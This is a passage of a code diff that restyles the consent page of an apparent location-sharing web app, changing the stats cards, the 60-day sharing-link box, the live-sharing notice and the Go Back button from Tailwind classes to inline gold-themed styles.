+                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.5)", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>Accuracy: ±{Math.round(coords.accuracy)}m</p>
               )}
               {address && (
-                <p className="text-xs text-white/40 mt-1 leading-relaxed">
+                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.45)", margin: 0, lineHeight: 1.45 }}>
                   {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
                 </p>
               )}
             </div>
           )}
 
-          {/* ── Stats ────────────────────────────────────────────────────────── */}
-          <div className="grid grid-cols-2 gap-3">
-            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <p className="text-2xl font-bold text-white">{updateCount}</p>
-              <p className="text-xs text-white/40 mt-0.5">Updates sent</p>
+          {/* ── Stats grid ── */}
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
+            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)" }}>
+              <p style={{ fontSize: 28, fontWeight: 800, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>{updateCount}</p>
+              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Updates sent</p>
             </div>
-            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
-              <p className="text-sm font-bold text-white">
+
+           <div style={{ borderRadius: 8, padding: "12px 14px", background: "linear-gradient(135deg,#0d2032 0%,#132b40 100%)", border: "1.5px solid rgba(70,160,220,0.28)", display: "flex", alignItems: "center", gap: 10 }}>
+             <Activity style={{ width: 16, height: 16, color: "#7dd3fc", flexShrink: 0 }} />
+             <div>
+               <p style={{ fontSize: 11, fontWeight: 700, color: "#7dd3fc", margin: "0 0 3px", letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>10-MINUTE SHARING SESSION</p>
+               <p style={{ fontSize: 12, color: "rgba(200,230,250,0.65)", margin: 0 }}>{sharingTimeLabel}</p>
+             </div>
+           </div>
+            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+              {/* Eagle eye watermark */}
+              <div style={{ position: "absolute", bottom: -4, right: -4, opacity: 0.18 }}>
+                <svg width="44" height="44" viewBox="0 0 40 44" fill="none">
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#8B6914" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#D4A843" stroke="#C8922A" strokeWidth="0.5"/>
+                  <circle cx="24" cy="11" r="3.5" fill="#D4A843" opacity="0.8"/>
+                  <circle cx="24" cy="11" r="1.5" fill="#FFF0C0"/>
+                </svg>
+              </div>
+              <p style={{ fontSize: 18, fontWeight: 700, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>
                 {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
               </p>
-              <p className="text-xs text-white/40 mt-0.5">Last update</p>
+              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Last update</p>
             </div>
           </div>
 
-          {/* ── 60-day sharing link ───────────────────────────────────────────── */}
-          <div className="rounded-xl p-4" style={{ background: "rgba(99,102,241,0.08)", border: "1px solid rgba(99,102,241,0.22)" }}>
-            <div className="flex items-center gap-2 mb-2">
-              <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
-              <p className="text-xs font-bold text-indigo-400 tracking-wide">60-Day Sharing Link</p>
+          {/* ── 60-day sharing link ── */}
+          <div style={{ borderRadius: 8, padding: "14px", background: "linear-gradient(135deg,#2a1e08 0%,#3a2c10 100%)", border: "1.5px solid #6b5020" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
+              <Share2 style={{ width: 14, height: 14, color: "#C8922A", flexShrink: 0 }} />
+              <p style={{ fontSize: 11, fontWeight: 700, color: "#C8922A", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>60-DAY SHARING LINK</p>
             </div>
-            <p className="text-xs text-white/40 mb-3 leading-relaxed">
-              This link keeps sharing active until{" "}
-              <strong className="text-white/65">
+            <p style={{ fontSize: 12, color: "rgba(180,150,80,0.55)", marginBottom: 10, lineHeight: 1.5 }}>
+              Active until{" "}
+              <strong style={{ color: "rgba(212,168,67,0.75)" }}>
                 {expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}
-              </strong>. Open it anytime to reconnect.
+              </strong>. Open anytime to reconnect.
             </p>
-            <div className="flex gap-2">
-              <div className="flex-1 min-w-0 rounded-lg px-3 py-2 text-xs font-mono text-white/40 truncate"
-                style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.08)" }}>
+            <div style={{ display: "flex", gap: 8 }}>
+              <div style={{ flex: 1, minWidth: 0, borderRadius: 6, padding: "8px 10px", fontSize: 11, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.4)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", background: "rgba(0,0,0,0.35)", border: "1px solid rgba(122,92,40,0.3)" }}>
                 {sharingLink}
               </div>
               <button
                 onClick={handleCopyLink}
-                className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all"
-                style={linkCopied
-                  ? { background: "rgba(16,185,129,.18)", border: "1px solid rgba(16,185,129,.35)", color: "#6ee7b7" }
-                  : { background: "rgba(99,102,241,.18)", border: "1px solid rgba(99,102,241,.35)", color: "#a5b4fc" }}
+                style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: "pointer", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.04em",
+                  ...(linkCopied
+                    ? { background: "rgba(16,130,60,0.2)", border: "1px solid rgba(16,185,129,0.35)", color: "#6ee7b7" }
+                    : { background: "linear-gradient(135deg,#8B6914,#C8922A)", color: "#1a0c05" }) }}
               >
-                {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
+                {linkCopied ? <Check style={{ width: 13, height: 13 }} /> : <Copy style={{ width: 13, height: 13 }} />}
                 {linkCopied ? "Copied!" : "Copy"}
               </button>
             </div>
           </div>
 
-          {/* ── Live-sharing active notice ────────────────────────────────────── */}
-          <div className="rounded-xl p-4" style={{ background: "rgba(16,185,129,0.08)", border: "1px solid rgba(16,185,129,0.2)" }}>
-            <div className="flex items-center gap-2 mb-1">
-              <CheckCircle className="h-4 w-4 text-emerald-400 flex-shrink-0" />
-              <p className="text-xs font-bold text-emerald-400">Live sharing is active</p>
+          {/* ── Live sharing active notice ── */}
+          <div style={{ borderRadius: 8, padding: "12px 14px", background: "linear-gradient(135deg,#0e2010 0%,#142816 100%)", border: "1.5px solid rgba(34,150,80,0.28)" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
+              <CheckCircle style={{ width: 14, height: 14, color: "#4ade80", flexShrink: 0 }} />
+              <p style={{ fontSize: 11, fontWeight: 700, color: "#4ade80", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>LIVE SHARING ACTIVE</p>
             </div>
-            <p className="text-xs text-white/40 leading-relaxed">
-              You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
+            <p style={{ fontSize: 12, color: "rgba(180,220,180,0.45)", margin: 0, lineHeight: 1.5 }}>
+              Keep this page open for continuous browser sharing. Android can stop web GPS if Chrome is removed from recent apps; use the PhoneLink mobile app for background sharing while you use other apps.
             </p>
           </div>
 
+          {/* ── Go back ── */}
           <button
-            className="w-full rounded-xl py-3 text-sm font-semibold text-white/50 flex items-center justify-center gap-2 transition-colors active:text-white/80"
-            style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.09)" }}
+            style={{ width: "100%", borderRadius: 8, padding: "12px", fontSize: 13, fontWeight: 600, color: "rgba(212,168,67,0.4)", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "rgba(122,92,40,0.08)", border: "1.5px solid rgba(122,92,40,0.2)", cursor: "pointer", fontFamily: "Georgia, serif", letterSpacing: "0.04em" }}
             onClick={() => {
               if (window.history.length > 1) { window.history.back(); } else {
                 const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
@@ -2113,7 +2936,7 @@ export default function ConsentPage() {
               }
             }}
           >
-            <ArrowLeft className="h-4 w-4" /> Go Back
+            <ArrowLeft style={{ width: 16, height: 16 }} /> Go Back
           </button>
         </div>
       </div>
